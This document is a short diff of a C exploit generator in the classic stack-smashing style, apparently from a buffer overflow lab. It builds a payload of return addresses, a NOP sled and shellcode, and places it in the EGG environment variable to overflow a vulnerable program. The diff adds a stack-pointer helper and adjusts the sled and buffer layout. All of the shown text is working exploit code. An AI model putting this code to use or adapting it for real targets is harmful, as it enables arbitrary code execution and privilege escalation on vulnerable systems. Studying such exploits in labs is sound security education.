@@ -2,7 +2,7 @@
 #include <stdlib.h>
 
 #define DEFAULT_OFFSET 0
-#define DEFAULT_BUFFER_SIZE 864
+#define DEFAULT_BUFFER_SIZE 300
 #define NOP 0x90
 
 char shellcode[] =
@@ -59,6 +59,10 @@ char shellcode[] =
 	;
 
 
+unsigned int get_sp(void) {
+	__asm__("movl %esp, %eax");
+}
+
 void main(int argc, char *argv[]) {
 	unsigned char *buff, *ptr;
 	int *addr_ptr, addr;
@@ -72,20 +76,19 @@ void main(int argc, char *argv[]) {
 		exit(0);
 	}
 
-	addr = 0xbfffffff - offset;
+	addr = get_sp() - offset;
 	printf("Using address: 0x%x\n", addr);
 
 	ptr = buff;
 	addr_ptr = (int *) ptr;
 
 	for(i = 0 ; i < bsize ; i +=4) *(addr_ptr++) = addr;
-	for(i = 372 ; i < 744 ; i ++) buff[i] = NOP;
-	ptr = buff + 744;
+	for(i = 0 ; i < 32 ; i ++) buff[i] = NOP;
+	ptr = buff + 32;
 	for(i = 0 ; i < strlen(shellcode) ; i ++) *(ptr++) = shellcode[i];
-	printf("%d\n", strlen(shellcode));
 	buff[bsize - 1] = '\0';
 
-	//for(i = 0 ; i < bsize ; i ++) printf("%d\t\t: \\x%x\n", i, buff[i]);
+	for(i = 0 ; i < bsize ; i ++) printf("%d\t\t: %x\n", i, buff[i]);
 
 	memcpy(buff, "EGG=", 4);
 	putenv(buff);
